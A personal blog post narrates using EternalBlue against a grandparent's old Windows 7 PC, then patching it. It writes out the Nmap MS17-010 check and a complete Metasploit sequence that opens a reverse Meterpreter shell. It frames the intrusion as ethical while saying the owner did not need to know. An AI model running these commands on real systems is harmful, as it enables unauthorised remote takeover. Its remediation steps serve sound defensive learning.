---
title: "My First Successful Hack: Unlocking Grandpa’s Computer’s Secrets"
date: 2025-03-13 
categories: [Pentest, Nmap, Metasploit]
image: https://wallpapercg.com/download/hacker-3529x1960-22383.jpeg
alt: "wallpaper"
---

When I was a kid, I loved visiting my grandparents’ house. It wasn’t just about getting spoiled with snacks or hearing Grandpa’s never-ending stories from the good old days — it was about the one thing that stood out in their house like a glowing treasure: Grandpa’s old desktop PC. This wasn’t any sleek, modern machine, no sir. This was the ancient HP Compaq 6200 Pro SFF PC running Windows 7, a relic from another time that probably had more dust than RAM. But to me, it was a playground.

![Computer](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*yorbSwOch3edGqJCOz_iUA.jpeg)

I’d spend hours there, clicking away, playing all the classics — Solitaire, Minesweeper, and whatever else I could discover in the dusty folders on that old computer. It was the golden age of my digital childhood, and I had no idea that this humble machine would eventually be the subject of my first ethical hacking experiment.

Fast forward to 2020, when I started seriously diving into cybersecurity. I was reading books, watching tech news, and even starting my journey through Capture The Flag (CTF) challenges. That’s when I came across the infamous EternalBlue exploit, which really piqued my interest. If you’ve never heard of it, here’s the rundown: EternalBlue is an exploit that takes advantage of a vulnerability in Microsoft’s SMBv1 (Server Message Block) protocol, a system used to share files and printers over a network. This vulnerability was patched in March 2017, but it’s still out there on many unpatched systems.

![Computer](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Kx9fgzGAH95FQCAXuOrTyA.jpeg)

Now, imagine me — fresh from my first CTF experience, all hyped up with my newfound knowledge — and then remembering Grandpa’s old PC sitting lonely in the corner of the room. Could it be? Could that ancient machine still be vulnerable to EternalBlue?

Let’s find out.

Just to clarify, the screenshots included in this post are not from my actual actions using Metasploit on Grandpa’s PC. These images are sourced from other people and are simply here to show you what the process looks like.

### Step 1: Scanning with Nmap
I was now armed with my ethical hacking toolkit, ready to make my move. The first step? Nmap. This is a network scanner that helps you discover what’s running on a machine and whether it’s vulnerable to any exploits.

I opened my terminal and ran the command:

```
nmap -p 445 --open --script smb-vuln-ms17-010 Grandpa's PC IP
```

For those of you not in the know, 445 is the port used for SMB, and the **`smb-vuln-ms17-010`** script is specifically designed to check if a system is vulnerable to the EternalBlue exploit (MS17-010). To my delight (and slight horror), it returned with a verdict that read something like:

```
445/tcp open  microsoft-ds
| smb-vuln-ms17-010: VULNERABLE
```

Well, well. Grandpa’s old machine was still running an outdated version of SMB, which meant it was vulnerable to EternalBlue.

![Vuln](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*vCRaOPmt5e0sYD2GQXtKYA.jpeg)

### Step 2: Launching the Metasploit Attack

At this point, I was grinning like a mad scientist in a lab. But let’s be real here: I wasn’t doing this for any nefarious purposes. I just had to know what would happen. I fired up Metasploit, the hacker’s tool of choice for exploiting vulnerabilities, and set up the EternalBlue exploit. It was time to see if I could access Grandpa’s old PC — legally, of course.

I entered the following command in the Metasploit console:
```
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <Grandpa's PC IP>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Your IP>
run
```
I was on the edge of my seat, fingers trembling. The screen was filled with messages, and then… bingo! The system was exploited, and I had a Meterpreter shell open, which gave me full control over Grandpa’s PC. I could see everything — the desktop, the files, the programs — and I had the ability to run commands as if I was physically sitting at the machine.

![Metasploit](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*DW2adbfzrYOJVsKFzWkkYg.jpeg)

![Metasploit](https://miro.medium.com/v2/resize:fit:640/format:webp/1*O3qi3l9ljMwoWkZ9YL5CqA.jpeg)

### Step 3: Patching the Vulnerability
Now that I had successfully accessed Grandpa’s old machine through the EternalBlue exploit, it was time to do what any responsible ethical hacker would do — patch the system and ensure it was secure. Grandpa didn’t need to know that his trusty old PC had been at risk. Here’s how I went about fixing things:

#### Option 1: Download and Install the Latest Windows Updates

The first step was to ensure that Grandpa’s PC was up-to-date with the latest security patches. This was the simplest option and would address not just the SMBv1 vulnerability but any other potential security holes.

- I navigated to Control Panel > Windows Update and clicked on Check for Updates.
- I allowed Windows to download and install any pending updates, including those related to SMBv1.
- After the updates installed, I restarted the PC to apply them.

#### Option 2: Change SMB Version to SMB2 or SMB3 Through the UI

Another approach to securing Grandpa’s PC was to upgrade the SMB protocol to a more secure version, like SMB2 or SMB3. Here’s how you can do that manually via the Windows Features UI:

- Open the Control Panel and go to Programs > Turn Windows features on or off.
- Scroll down to find SMB 1.0/CIFS File Sharing Support. Uncheck this option to disable SMBv1.
- Check the box next to SMB Direct (for SMB3 support) if it’s not already enabled.
- Click OK to apply the changes.
- Restart the PC.

![Windows Features](https://miro.medium.com/v2/resize:fit:640/format:webp/1*_riVnr5O-2jgqAYr_JQbaA.png)

This will disable the outdated and vulnerable SMBv1 protocol while leaving the more secure SMB2 and SMB3 protocols enabled, helping ensure better security.

#### Option 3: Disable SMBv1 via Command Line

If you prefer to disable SMBv1 through a command-line interface, here’s how you can do it using PowerShell:

1. Open PowerShell as an Administrator (right-click on the Start button, select Windows PowerShell (Admin)).
2. Run the following command to disable SMBv1:

```
Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol
```

3. Once the command executes, restart the PC for the changes to take effect.

By disabling SMBv1, we ensured that the PC wouldn’t be vulnerable to the EternalBlue exploit or any similar attacks targeting that old protocol.

### Step 4: Test and Celebrate

After the restart, I ran the same Nmap scan again, just to make sure the vulnerability was gone:

```
nmap -p 445 --open --script smb-vuln-ms17-010 <Grandpa's PC IP>
```

To my relief, the scan now returned with no vulnerability. Grandpa’s PC was safe, and I could breathe easy knowing I’d responsibly explored my curiosity without causing any harm.

Final Thoughts
As I closed the terminal, I couldn’t help but smile. Who would’ve thought my childhood adventures on Grandpa’s old desktop PC would lead to my first real ethical hack? I didn’t just play games on that computer — I learned how to protect it from potential threats in the process.

Moral of the story? Always stay curious, never stop learning, and remember that even the oldest PCs can still teach you a thing or two (as long as you patch them afterward!).

---